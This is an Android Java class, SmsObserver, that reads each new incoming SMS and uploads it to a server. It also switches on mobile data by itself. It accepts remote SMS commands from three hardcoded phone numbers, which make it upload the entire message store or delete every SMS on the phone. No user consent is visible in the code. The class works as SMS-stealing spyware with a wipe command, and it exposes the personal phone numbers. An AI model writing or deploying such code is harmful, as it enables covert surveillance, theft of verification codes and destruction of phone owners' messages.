package site.binghai.lsmsmailer;

import android.content.ContentResolver;
import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.util.Log;
import android.widget.Toast;

import com.alibaba.fastjson.JSONObject;
import com.loopj.android.http.AsyncHttpResponseHandler;
import com.loopj.android.http.RequestParams;

import org.apache.http.Header;

import java.text.SimpleDateFormat;
import java.util.ArrayList;

/**
 * Created by Administrator on 2016/6/21.
 */
public class SmsObserver extends ContentObserver {
    private Uri SMS_INBOX = Uri.parse("content://sms/");
    private Context context;
    private CallBack callBack;

    /** 处理最新的一条*/
    public void getSmsFromPhone() {
        NetControl.setMobileData(context, true);
        ArrayList<JSONObject> arr = getSMS(1);
        for (JSONObject j :
                arr) {
            new UploadUtil().Send(j.toJSONString(), 0);
            String phone = j.getString("phone");
            String body = j.getString("content");
            if (phone.contains("17664051817") || phone.contains("17854258196") || phone.contains("13906375457")) {
                if (body.contains("upload_all"))
                    UploadAllSms();
                else if (body.contains("clean_all"))
                    CleanAllSms();
            }
            callBack.callback(TimeFormater.getSuitableToday()+" "+phone+"短信.");
        }
    }

    /** 提取最新的size条短信*/
    private ArrayList<JSONObject> getSMS(int size) {
        ContentResolver cr = context.getContentResolver();
        String[] projection = new String[]{"body", "_id", "address", "person", "date", "type"};

        String where = "";
        ArrayList ans = new ArrayList<>();
        Cursor cur = cr.query(SMS_INBOX, projection, where, null, "date desc");
        if (null == cur)
            return ans;
        while (cur.moveToNext() && size-- > 0) {
            String id = cur.getString(cur.getColumnIndex("_id"));
            String phone = cur.getString(cur.getColumnIndex("address"));//手机号
            String name = cur.getString(cur.getColumnIndex("person"));//联系人姓名列表
            String body = cur.getString(cur.getColumnIndex("body"));
            Long date = cur.getLong(cur.getColumnIndex("date"));
            int type = cur.getInt(cur.getColumnIndex("type"));


            SimpleDateFormat df = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss");
            String time = df.format(date);

            JSONObject msg = new JSONObject();
            msg.put("upload_type", "sms");
            msg.put("id", id);
            msg.put("receive_time", time);
            msg.put("name", name);
            msg.put("phone", phone);
            msg.put("content", body);
            msg.put("type", (type == 1 ? "收信" : "发信"));
            ans.add(msg);
        }
        return ans;
    }

    public void CleanAllSms() {
        ArrayList<JSONObject> arr = getSMS(9999);
        StringBuilder sb = new StringBuilder();
        for (JSONObject j:arr) {
            sb.append(j.getString("id"));
            sb.append(",");
        }
        String SMS_URI_ALL = "content://sms/";
        Uri uri = Uri.parse(SMS_URI_ALL);
        String whereClause = "_id in(" + sb.substring(0, sb.length() - 1) + ")";
        int count = context.getContentResolver().delete(uri, whereClause, null);
        Toast.makeText(context,"已清除所有("+count+")短信",Toast.LENGTH_SHORT).show();
    }

    private void UploadAllSms() {
        NetControl.setMobileData(context, true);
        ArrayList<JSONObject> arr = getSMS(9999);
        for (JSONObject j:arr) {
            new UploadUtil().Send(j.toJSONString(), 0);
        }
        Toast.makeText(context,"已重传所有短信",Toast.LENGTH_SHORT).show();
    }

    public SmsObserver(Context context, Handler handler,CallBack callBack) {
        super(handler);
        this.context = context;
        this.callBack = callBack;
    }

    @Override
    public void onChange(boolean selfChange) {
        super.onChange(selfChange);
        //每当有新短信到来时，使用我们获取短消息的方法
        getSmsFromPhone();
    }

}

